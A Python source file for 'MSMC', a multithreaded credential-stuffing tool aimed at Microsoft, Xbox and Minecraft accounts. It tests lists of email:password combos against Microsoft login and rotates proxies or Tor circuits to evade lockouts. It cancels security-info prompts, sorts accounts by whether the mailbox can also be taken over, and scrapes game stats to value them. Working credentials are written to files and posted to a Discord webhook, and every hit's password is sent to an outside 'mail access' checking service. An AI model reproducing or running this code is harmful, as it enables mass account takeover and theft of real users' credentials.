import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, subprocess, tarfile, traceback, warnings, socket
from colorama import Fore
from stem import Signal
from stem.control import Controller
from console import utils
from tkinter import filedialog

logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
fname = ""
webhook_message = ""
webhook = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...

class Capture:
    def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes, access, sbcoins, bwstars):
        global errors
        try:
            payload = {
                "content": webhook_message
                    .replace("<email>", email)
                    .replace("<password>", password)
                    .replace("<name>", name)
                    .replace("<hypixel>", hypixel)
                    .replace("<level>", level)
                    .replace("<firstlogin>", firstlogin)
                    .replace("<lastlogin>", lastlogin)
                    .replace("<ofcape>", cape)
                    .replace("<capes>", capes)
                    .replace("<access>", access)
                    .replace("<skyblockcoins>", sbcoins)
                    .replace("<bedwarsstars>", bwstars),
                "username": "MSMC"
            }
            requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except Exception as e: 
            errors+=1
            #open(f"results/error.txt", 'a').write(f"Error: {e}\nLine: {traceback.extract_tb(e.__traceback__)[-1].lineno}")

    def hypixel(name):
        global errors
        try:
            oname = "N/A"
            olevel = "N/A"
            ofirstlogin = "N/A"
            olastlogin = "N/A"
            obwstars = "N/A"
            osbcoins = "N/A"
            tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
            try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
            except: pass
            try: olevel = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except: pass
            try: ofirstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except: pass
            try: olastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except: pass
            try: obwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
            except: pass
            try:
                req = requests.get("https://sky.shiiyu.moe/stats/"+name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                osbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
            except: pass
            return oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars
        except: errors+=1

    def optifine(name):
        try:
            txt = requests.get(f'http://s.optifine.net/capes/{name}.png', proxies=getproxy(), verify=False).text
            if "Not found" in txt: return "No"
            else: return "Yes"
        except: return "Unknown"

    def full_access(email, password):
        global errors
        try:
            out = json.loads(requests.get(f"https://email.avine.tools/check?email={email}&password={password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
            if out["Success"] == 1: return True
        except: errors+=1
        return False
    
    def handle(mc, email, password, capes):
        global hits, mfa, sfa, cpm, checked
        if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
        oname, olevel, ofirstlogin, olastlogin, osbcoins, obwstars = Capture.hypixel(mc)
        cape = Capture.optifine(mc)
        access = "SFA"
        if Capture.full_access(email, password): 
            access = "FULL ACCESS"
            mfa+=1
            cpm+=1
            checked+=1
            open(f"results/{fname}/MFA.txt", 'a').write(f"{email}:{password}\n")
        else: 
            open(f"results/{fname}/SFA.txt", 'a').write(f"{email}:{password}\n")
            sfa+=1
            cpm+=1
            checked+=1
        with open(f"results/{fname}/Capture.txt", 'a') as file:
            file.write(f'''Name: {mc}
Email: {email}
Password: {password}
Hypixel: {oname}
Level: {olevel}
First Login: {ofirstlogin}
Last Login: {olastlogin}
Skyblock Coins: {osbcoins}
Bedwars Stars: {obwstars}
Optifine Cape: {cape}
MC Capes: {capes}
Access: {access}
=======================\n''')
        Capture.notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes, access, osbcoins, obwstars)

def get_urlPost_sFTTag(session, port, tries = 0):
    global retries
    while tries < maxretries:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session, port
        except: pass
        if proxytype == "'4'":
            stop_tor(port)
            port, session = get_tor(session)
        else:
            session.proxy = getproxy()
        retries+=1
        tries+=1
    return None

def get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries=0):
    global bad, checked, cpm, twofa, retries, checked
    try:
        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = None
            for item in login_request.url.split("#")[1].split("&"):
                key, value = item.split("=")
                if key == 'access_token':
                    token = requests.utils.unquote(value)
                    break
            return token, session, port
        #sec info change
        elif 'cancel?mkt=' in login_request.text:
            data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            if '#' in fin.url and fin.url != sFTTag_url:
                token = None
                for item in fin.url.split("#")[1].split("&"):
                    key, value = item.split("=")
                    if key == 'access_token':
                        token = requests.utils.unquote(value)
                        break
                return token, session, port
        elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
            if proxytype == "'4'":
                stop_tor(port)
                port, session = get_tor(session)
            else:
                session.proxy = getproxy()
            if tries < maxretries:
                retries+=1
                tries+=1
                #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
                return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return None, session, port
        #2fa
        elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            twofa+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
            with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
            return None, session, port
        #bad
        elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return None, session, port
        #blocked, retry
        else:
            if proxytype == "'4'":
                stop_tor(port)
                port, session = get_tor(session)
            else:
                session.proxy = getproxy()
            if tries < maxretries:
                retries+=1
                tries+=1
                return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return None, session, port
    except:
        if tries < maxretries:
            if proxytype == "'4'":
                stop_tor(port)
                port, session = get_tor(session)
            else:
                session.proxy = getproxy()
            retries+=1
            tries+=1
            return get_xbox_rps(session, email, password, urlPost, sFTTag, port, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return None, session, port

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Valid Mail: {email}:{password}")

def authenticate(email, password):
    global vm, bad, retries, checked, cpm, hits
    port = None
    try:
        session = requests.Session()
        session.verify = False
        if proxytype == "'4'": 
            port, session = get_tor(session)
        else:
            proxy = getproxy()
            session.proxies = proxy
        urlPost, sFTTag, session, port = get_urlPost_sFTTag(session, port)
        outs = get_xbox_rps(session, email, password, urlPost, sFTTag, port)
        if outs is not None:
            token, session, port = outs
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token is not None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token is not None:
                        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                        access_token = mc_login.json().get('access_token')
                        if access_token is not None:
                            mc, capes = account(access_token, session)
                            if mc != None:
                                hit = True
                                Capture.handle(mc, email, password, capes)
                            else:
                                checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
                                if int(checkrq.status_code) == 200:
                                    if 'game_minecraft' in checkrq.text or 'product_minecraft' in checkrq.text:
                                        hit = True
                                        hits+=1
                                        cpm+=1
                                        checked+=1
                                        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
                                        if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
                                        Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
            except: pass
            if hit == False: validmail(email, password)
        if proxytype == "'4'": stop_tor(port)
    except Exception as e:
        print(e)
        traceback.print_exc()
        line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
        print("Exception occurred at line:", line_number)
        if proxytype == "'4'": stop_tor(port)
        retries+=1
        authenticate(email, password)

def account(access_token, session):
    r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
    capes = ""
    if r.status_code == 200:
        try:
            capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
        except: capes = "Unknown"
        return r.json()['name'], capes
    else:
        error+=1
        return None, None

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, args=()).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    #os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def get_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('localhost', 0))
        _, port = s.getsockname()
        return port

def get_tor(session):
    port = get_free_port()
    subprocess.Popen([os.path.join(os.getcwd(), r"tor\tor.exe"),
        '--SocksPort', str(port),
        '--ControlPort', str(port+1)
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    session.proxies = {'http': 'socks5://127.0.0.1:'+str(port), 'https': 'socks5://127.0.0.1:'+str(port)}
    return port, session

def stop_tor(port):
    with Controller.from_port(port=port+1) as controller:
        controller.authenticate()
        controller.signal(Signal.SHUTDOWN)

def getproxy():
    if proxytype != "'5'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'" or proxytype  == "'4'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global webhook, maxretries, webhook_message
    if not os.path.isfile("config.ini"):
        config = configparser.ConfigParser(allow_no_value=True)
        config['Settings'] = {
            'HitWebhook': 'paste your discord webhook here',
            'MaxRetries': '5',
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Hypixel: <hypixel>
Level: <level>
First Login: <firstlogin>
Last Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Access: <access>
Skyblock Coins: <skyblockcoins>
Bedwars Stars: <bedwarsstars>'''}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
    read_file = configparser.ConfigParser()
    read_file.read('config.ini')
    webhook = str(read_file['Settings']['HitWebhook'])
    maxretries = int(read_file['Settings']['MaxRetries'])
    webhook_message = str(read_file['Settings']['WebhookMessage'])

def checkandinstalltor():
    global proxylist
    if not os.path.exists("tor/tor.exe"):
        print(Fore.YELLOW+"Tor is not installed. Downloading now.")
        req = requests.get("https://www.torproject.org/download/tor/", verify=False)
        downloadlink = re.search(r'(?<=<td>Windows \(x86_64\) </td>\n          <td>\n            \n  \n  \n  \n\n  <a class=\"downloadLink\" href=\").+?(?=\">)', req.text).group()
        torfilename = "tor.tar.gz"
        response = requests.get(downloadlink, stream=True)
        if response.status_code == 200:
            with open(torfilename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=128):
                    f.write(chunk)
            print(f"File '{torfilename}' downloaded successfully.")
            with tarfile.open(torfilename, 'r:gz') as tar:
                tar.extractall()
        else:
            print(f"Failed to download the file. Status code: {response.status_code}")
        os.remove(torfilename)
        print("Downloaded Tor successfully.")
    if not os.path.exists("tor/data"):
        os.makedirs("tor/data")

def Main():
    global proxytype, screen
    utils.set_title("MSMC by KillinMachine")
    os.system('cls')
    try:
        loadconfig()
    except:
        print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(speed for checking, i recommend 100, give more threads if its slow. if you're using tor for proxies give it at least 1000 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+f"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] Tor - [5] None")
    proxytype = repr(readchar.readkey())
    if proxytype == "'4'": checkandinstalltor()
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()
Main()
